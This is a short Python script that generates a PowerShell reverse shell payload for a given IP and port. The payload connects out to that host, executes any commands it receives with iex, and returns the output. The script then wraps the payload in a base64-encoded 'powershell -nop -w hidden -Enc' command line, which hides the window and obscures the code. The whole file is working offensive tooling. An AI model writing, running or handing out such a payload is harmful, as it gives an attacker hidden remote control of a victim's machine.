import sys
import base64

def help():
   print("USAGE: %s IP PORT" % sys.argv[0])
   print("Returns reverse shell Powershell base64 encoded cmdline payload connecting to IP:PORT")
   exit()

try:
   ip = sys.argv[1]
   port = str(sys.argv[2])
except:
   help()

payload = "$client = New-Object System.Net.Sockets.TCPClient('"+ip+"',"+port+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()".format(ip, port)
#payload = payload % (ip, port)

cmdline = "powershell -nop -w hidden -Enc " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print ("RAW:\n")
print (payload)
print ("\n")
print ("BASE64\n")
print (cmdline)
